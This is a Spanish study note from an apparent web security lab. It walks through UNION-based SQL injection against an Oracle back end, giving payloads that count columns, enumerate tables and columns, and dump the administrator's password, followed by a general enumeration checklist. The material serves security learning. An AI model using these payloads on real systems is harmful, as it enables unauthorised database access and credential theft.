#labs #web #ejercicio

![[Pasted image 20250610213003.png]]

### ğŸ§ª ConfiguraciÃ³n del reto  
Objetivo: enumerar tablas / columnas y obtener la contraseÃ±a del **administrator** en un back-end Oracle 19c.

â„¹ï¸ Nota:
* En Oracle los diccionarios de datos mÃ¡s Ãºtiles son `ALL_TABLES` (tablas accesibles) y `ALL_TAB_COLUMNS` (columnas).  
* `TABLE_NAME` y demÃ¡s campos se almacenan en MAYÃšSCULAS.

### â–¶ï¸ Pasos y payloads (completados)

```sql
-- 1ï¸âƒ£ Determinar nÂº columnas (igual que antes; dos columnas)
' ORDER BY 2-- -

-- 2ï¸âƒ£ Enumerar tablas
' UNION SELECT table_name, NULL FROM all_tables-- -
APP_USERS_AND_ROLES
SDO_PREFERRED_OPS_USER
USERS_YLMNQS
...

-- 3ï¸âƒ£ Enumerar columnas de la tabla USERS_YLMNQS
' UNION SELECT column_name, NULL
  FROM all_tab_columns
  WHERE table_name='USERS_YLMNQS'-- -
USERNAME_VGSQPD
PASSWORD_BKSTUT

-- 4ï¸âƒ£ Volcar datos de la tabla
' UNION SELECT USERNAME_VGSQPD, PASSWORD_BKSTUT
  FROM USERS_YLMNQS-- -
administrator | 9uukqpx9wvvkvwa8nkij
```

### ğŸ’¡ ExplicaciÃ³n paso a paso
> **Â¿Por quÃ© `NULL` como segunda columna?**  
> El servidor espera exactamente 2 columnas y ambas deben ser del mismo tipo (VARCHAR2). Si solo queremos mostrar una columna, podemos rellenar la otra con `NULL` o con una cadena literal `'a'`.

> **ConversiÃ³n a mayÃºsculas**  
> Oracle almacena los identificadores no entrecomillados en mayÃºsculas; por eso el `WHERE table_name='USERS_YLMNQS'`.

> **Concatenar en 1 sola columna (opcional)**  
> Si la app solo muestra la primera columna, combina usuario y contraseÃ±a:  
> ```sql
> ' UNION SELECT USERNAME_VGSQPD||':'||PASSWORD_BKSTUT, NULL FROM USERS_YLMNQS-- -
> ```

### ğŸ“Œ Resultado
* ContraseÃ±a administrator: **9uukqpx9wvvkvwa8nkij**
* Tabla sensible localizada: `USERS_YLMNQS`  
* Columnas clave: `USERNAME_VGSQPD`, `PASSWORD_BKSTUT`

---

## ğŸ› ï¸ Checklist mental para labs de enumeraciÃ³n

1. **DESCUBRIR columnas** â€“ `ORDER BY n` o `UNION SELECT NULL,...`
2. **Probar tipos/compatibilidad** â€“ cadenas vs nÃºmeros.
3. **Diccionarios de datos**  
   * MySQL â‰¤ 5: `information_schema.tables / columns`  
   * PostgreSQL: lo mismo, plus `pg_catalog`.  
   * Oracle: `ALL_TABLES`, `ALL_TAB_COLUMNS`, `DBA_*`, `V$VERSION`.
4. **Recordar mayÃºsculas** (Oracle).
5. **Volcar** â€“ columnas â†’ tabla â†’ credenciales.

> ğŸ’¬ *Tip:* si la aplicaciÃ³n sÃ³lo muestra la 1Âª columna, concatena varias con `||` (Oracle / Postgres) o `CONCAT()` (MySQL).
